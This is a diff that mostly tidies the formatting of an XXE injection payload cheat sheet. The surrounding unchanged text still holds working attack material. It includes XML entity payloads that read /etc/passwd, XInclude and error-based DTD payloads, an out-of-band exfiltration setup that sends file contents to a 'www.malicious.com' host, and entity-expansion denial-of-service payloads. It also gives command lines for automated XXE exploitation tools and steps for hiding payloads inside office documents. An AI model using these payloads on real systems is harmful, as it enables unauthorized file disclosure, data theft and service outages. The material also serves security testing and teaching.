@@ -2,10 +2,10 @@
 
 > An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.
 
-**Internal Entity**: If an entity is declared within a DTD it is called as internal entity.    
+**Internal Entity**: If an entity is declared within a DTD it is called as internal entity.
 Syntax: `<!ENTITY entity_name "entity_value">`
 
-**External Entity**: If an entity is declared outside a DTD it is called as external entity. Identified by `SYSTEM`.    
+**External Entity**: If an entity is declared outside a DTD it is called as external entity. Identified by `SYSTEM`.
 Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
 
 ## Summary
@@ -35,15 +35,20 @@ Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
 ## Tools
 
 - [xxeftp](https://github.com/staaldraad/xxeserv) - A mini webserver with FTP support for XXE payloads
+
   ```
   sudo ./xxeftp -uno 443
   ./xxeftp -w -wps 5555
   ```
+
 - [230-OOB](https://github.com/lc/230-OOB) - An Out-of-Band XXE server for retrieving file contents over FTP and payload generation via [http://xxe.sh/](http://xxe.sh/)
+
   ```
-  $ python3 230.py 2121
+  python3 230.py 2121
   ```
+
 - [XXEinjector](https://github.com/enjoiz/XXEinjector) - Tool for automatic exploitation of XXE vulnerability using direct and different out of band methods
+
   ```bash
   # Enumerating /etc directory in HTTPS application:
   ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl
@@ -68,20 +73,26 @@ Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
   # Log requests only:
   ruby XXEinjector.rb --logger --oob=http --output=/tmp/out.txt
   ```
+
 - [oxml_xxe](https://github.com/BuffaloWill/oxml_xxe) - A tool for embedding XXE/XML exploits into different filetypes (DOCX/XLSX/PPTX, ODT/ODG/ODP/ODS, SVG, XML, PDF, JPG, GIF)
+
   ```
   ruby server.rb
   ```
+
 - [docem](https://github.com/whitel1st/docem) - Uility to embed XXE and XSS payloads in docx,odt,pptx,etc
+
   ```
   ./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_document -kt -sx docx
   ./docem.py -s samples/xxe/sample_oxml_xxe_mod1.docx -pm xxe -pf payloads/xxe_special_2.txt -kt -pt per_place
   ./docem.py -s samples/xss_sample_0.odt -pm xss -pf payloads/xss_tiny.txt -pm per_place
   ./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_file -kt -sx docx
   ```
+
 - [otori](http://www.beneaththewaves.net/Software/On_The_Outside_Reaching_In.html) - Toolbox intended to allow useful exploitation of XXE vulnerabilities.
+
   ```
-  python ./otori.py --clone --module "G-XXE-Basic" --singleuri "file:///etc/passwd" --module-options "TEMPLATEFILE" "TARGETURL" "BASE64ENCODE" "DOCTYPE" "XMLTAG" --outputbase "./output-generic-solr" --overwrite --noerrorfiles --noemptyfiles --nowhitespacefiles --noemptydirs 
+  python ./otori.py --clone --module "G-XXE-Basic" --singleuri "file:///etc/passwd" --module-options "TEMPLATEFILE" "TARGETURL" "BASE64ENCODE" "DOCTYPE" "XMLTAG" --outputbase "./output-generic-solr" --overwrite --noerrorfiles --noemptyfiles --nowhitespacefiles --noemptydirs
   ```
 
 ## Detect the vulnerability
@@ -103,7 +114,7 @@ It might help to set the `Content-Type: application/xml` in the request when sen
 
 ### Classic XXE
 
-We try to display the content of the file `/etc/passwd` 
+We try to display the content of the file `/etc/passwd`
 
 ```xml
 <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
@@ -173,7 +184,7 @@ We try to display the content of the file `/etc/passwd`
 
 ### XInclude attacks
 
-When you can't modify the **DOCTYPE** element use the **XInclude** to target 
+When you can't modify the **DOCTYPE** element use the **XInclude** to target
 
 ```xml
 <foo xmlns:xi="http://www.w3.org/2001/XInclude">
@@ -192,7 +203,6 @@ XXE can be combined with the [SSRF vulnerability](https://github.com/swisskyrepo
 ]>
 <foo>&xxe;</foo>
 ```
-
 
 ## Exploiting XXE to perform a deny of service
 
@@ -225,7 +235,6 @@ h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
 i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
 ```
 
-
 ## Error Based XXE
 
 **Payload to trigger the XXE**
@@ -240,13 +249,13 @@ i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
 ```
 
 **Contents of ext.dtd**
+
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
 %eval;
 %error;
 ```
-
 
 ## Exploiting blind XXE to exfiltrate data out-of-band
 
@@ -263,7 +272,6 @@ The easiest way to test for a blind XXE is to try to load a remote resource such
 ]>
 <r></r>
 ```
-
 
 Send the content of `/etc/passwd` to "www.malicious.com", you may receive only the first line.
 
@@ -329,10 +337,10 @@ Send the XML file to the `deploy` folder.
 
 Ref. [brianwrf/CVE-2018-11788](https://github.com/brianwrf/CVE-2018-11788)
 
-
 ## XXE with local DTD
 
 In some case, outgoing connections are not possible from the web application. DNS names might even not resolve externally with a payload like this:
+
 ```xml
 <!DOCTYPE root [<!ENTITY test SYSTEM 'http://h3l9e5soi0090naz81tmq5ztaaaaaa.burpcollaborator.net'>]>
 <root>&test;</root>
@@ -368,7 +376,6 @@ Assuming payloads such as the previous return a verbose error. You can start poi
 ```
 
 [Other payloads using different DTDs](https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md)
-
 
 ## XXE in exotic files
 
@@ -445,7 +452,7 @@ Format of an Open XML file (inject the payload in any .xml file):
 
 Then update the file `zip -u xxe.docx [Content_Types].xml`
 
-Tool : https://github.com/BuffaloWill/oxml_xxe
+Tool : <https://github.com/BuffaloWill/oxml_xxe>
 
 ```xml
 DOCX/XLSX/PPTX
@@ -507,7 +514,6 @@ updating: xl/_rels/workbook.xml.rels (deflated 66%)
 updating: xl/sharedStrings.xml (deflated 17%)
 ```
 
-
 ## References
 
 * [XML External Entity (XXE) Processing - OWASP](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)
@@ -519,7 +525,7 @@ updating: xl/sharedStrings.xml (deflated 17%)
 * [From blind XXE to root-level file read access - December 12, 2018 by Pieter Hiele](https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/)
 * [How we got read access on Google’s production servers](https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers/) April 11, 2014 by  detectify
 * [Blind OOB XXE At UBER 26+ Domains Hacked](http://nerdint.blogspot.hk/2016/08/blind-oob-xxe-at-uber-26-domains-hacked.html) August 05, 2016 by Raghav Bisht
-* [OOB XXE through SAML](https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf) by Sean	Melia @seanmeals
+* [OOB XXE through SAML](https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf) by Sean Melia @seanmeals
 * [XXE in Uber to read local files](https://httpsonly.blogspot.hk/2017/01/0day-writeup-xxe-in-ubercom.html) 01/2017
 * [XXE inside SVG](https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/) JUNE 22, 2016 by YEO QUAN YANG
 * [Pentest XXE - @phonexicum](https://phonexicum.github.io/infosec/xxe.html)
